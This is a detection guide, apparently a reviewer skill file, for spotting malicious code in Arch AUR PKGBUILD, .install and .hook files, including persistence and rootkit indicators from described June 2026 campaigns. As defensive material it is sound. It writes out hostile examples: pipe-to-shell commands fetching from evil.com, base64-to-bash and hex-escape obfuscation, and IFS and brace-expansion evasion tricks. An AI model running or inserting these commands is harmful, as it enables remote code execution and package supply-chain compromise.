---
name: obfuscation-ttps
description: Detection of obfuscated and hidden malicious code in PKGBUILDs
---

# Obfuscation Detection

## Shell Obfuscation Patterns

Malicious code in PKGBUILDs is often hidden through obfuscation. Common techniques:

- **Base64 encoding**: `echo <base64> | base64 -d | bash` or `eval $(base64 -d ...)`
- **Hex/octal escapes**: `$'\x65\x76\x61\x6c'` (evaluates to "eval")
- **Variable indirection**: `x="cur"; y="l"; $x$y example.com | bash`
- **String concatenation**: `wget$IFS$1$IFS...` using IFS as separator
- **Brace expansion tricks**: `{curl,-s,-L} evil.com/script | {bash,-c}`
- **printf obfuscation**: `$(printf '\x63\x75\x72\x6c')` to construct "curl"

## Pipe-to-Shell

The classic remote code execution pattern:

```
curl -s http://evil.com/script | bash
wget -qO- http://evil.com/script | sh
curl ... | sudo bash
```

Also check for indirect pipe-to-shell:
```
source <(curl -s http://evil.com/script)
eval "$(curl -s http://evil.com/script)"
. <(wget -qO- http://evil.com/script)
/dev/tcp reverse shells
```

## Hidden in Plain Sight

- Commands split across multiple lines with `\` continuations to obscure the full payload.
- Long whitespace padding to push code off-screen in common editors.
- Code inside comments that is later uncommented or eval'd.
- Encrypted/encoded data files included alongside PKGBUILD and decoded at build time.
- Use of `dd`, `xxd`, or `uudecode` to reconstruct binaries from text.

## install= Script Abuse

The `install=` scriptlet is rarely needed. Flag any `install=` file that:
- Downloads or executes external code
- Modifies files outside the package prefix
- Adds cron jobs, systemd timers, or autostart entries
- Hides itself by clearing bash history or removing log entries

## prepare() / build() Abuse

The build functions should only compile the package. Flag:
- Network access during `prepare()` or `build()` (should happen in `source=` only)
- Writing to `$HOME`, `/tmp` with predictable names, or outside `$srcdir`
- `git clone` or `svn checkout` inside build functions without checksum verification
- Any use of `sudo`, `chmod 777`, or `setuid` during build

## systemd Persistence (June 2026 Campaign Pattern)

The atomic-lockfile malware installed systemd services for persistence. Flag any code that:

- Creates or installs `.service` files with `Restart=always` and `RestartSec=30`
- Installs systemd user units to `~/.config/systemd/user/`
- Uses `systemctl enable` or `systemctl start` in install scripts
- Hides the service with innocuous names (e.g. `dbus-helper`, `systemd-analyze`)
- Services that run on boot (`WantedBy=multi-user.target` or `WantedBy=default.target`)
- Services that execute from `/tmp`, `/dev/shm`, or hidden dot-directories

## eBPF Rootkit Indicators (June 2026 Campaign Pattern)

The attack deployed an eBPF rootkit when running as root with CAP_BPF:

- Any reference to `bpftool`, `libbpf`, or eBPF program loading
- Mounting `/sys/fs/bpf` or creating BPF maps
- References to process/file/inode hiding (`hidden_pids`, `hidden_names`, `hidden_inodes`)
- Code that checks for `CAP_BPF` capability before activating rootkit features
- Kernel module loading (`insmod`, `modprobe`) without legitimate hardware justification

## .install / .hook File Injection (June 2026 Campaign Pattern)

The June 2026 attackers specifically targeted `.install` and `.hook` files, which are
less frequently reviewed than PKGBUILD:

- `.install` files should ONLY contain standard functions: `pre_install`, `post_install`,
  `pre_upgrade`, `post_upgrade`, `pre_remove`, `post_remove`
- Any code outside these functions is suspicious
- `.hook` files are extremely rare in AUR packages — their presence alone is a red flag
- npm/bun install commands inside `.install` post_install() functions
- Hidden processes spawned in post_install that persist after the package manager exits

## Shell Config Injection (Russian Spam Campaign Pattern)

A separate June 2026 campaign injected spam into shell config files:

- `echo` statements appending to `~/.bashrc`, `~/.zshrc`, `~/.profile`
- Any PKGBUILD or install script that modifies shell dotfiles
- Modifications to `/etc/skel/.bashrc` affecting all new users
- Messages injected into user shells at every login — also serves as persistence test
